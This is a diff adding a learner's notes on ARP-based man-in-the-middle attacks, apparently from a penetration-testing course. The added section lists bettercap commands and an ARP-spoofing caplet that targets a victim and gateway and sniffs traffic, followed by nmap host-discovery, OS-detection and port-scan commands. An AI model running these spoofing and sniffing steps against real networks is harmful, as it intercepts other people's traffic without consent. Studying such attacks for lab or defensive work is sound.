@@ -45,3 +45,35 @@ ARP Protocol
 message go to router, bob will ask all devices whether they are the router(looking for an ip address), the router will say she is the router giving you the mac address (same thing will happen between first and second router...)
 
 I can tell people in the network that I am the router giving them my mac address to become man in the middle
+
+bettercap: (man in the middle)
+sudo bettercap
+net.probe on
+net.show
+192.168.1.5, 192.168.1.8, 192.168.1.9
+now on another terminal:
+  sudo nmap -O 192.168.1.5 (gather information of the connected device)
+
+// TODO, this didn't work
+sudo bettercap -iface eth0 -caplet arp.cap
+// arp.cap
+  net.probe on
+  set arp.spoof.fullduplex true
+  set arp.spoof.targets victim ip addr, geteway
+  arp.spoof on
+  set net.sniff.local true
+  net.sniff on
+
+nmap -sn 192.168.1.0/24 // scan all hosts within the network to get up ips
+I can also give it group of ips to scan
+  echo "192.168.1.0/24/24" >ipsFile
+  nmap -sn -iL ipsFile
+sudo nmap -O 192.168.1.1,101,105 // know the os of these address and services they are using
+nmap 192.168.1.101 // he got back all ports that exists on tcp with their services
+  nmap by default looks for tcp ports and looks for the most popular 1000 ports
+  sudo nmap -sU 192.168.1.101 // now it gives the udp ports only
+-nmap could report to which service these ports probably corresponds to
+  // for ezample port 80 probably corresponds to a web server
+  nmap -sV 192.168.1.101
+
+
